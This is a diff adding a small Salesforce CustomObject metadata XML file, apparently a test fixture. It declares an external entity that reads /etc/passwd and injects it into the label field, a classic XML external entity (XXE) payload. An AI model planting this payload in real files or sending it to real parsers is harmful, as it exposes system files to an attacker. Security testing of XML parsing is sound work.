@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE CustomObject [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
+<CustomObject xmlns="http://soap.sforce.com/2006/04/metadata">
+    <label>&secret;</label>
+</CustomObject>
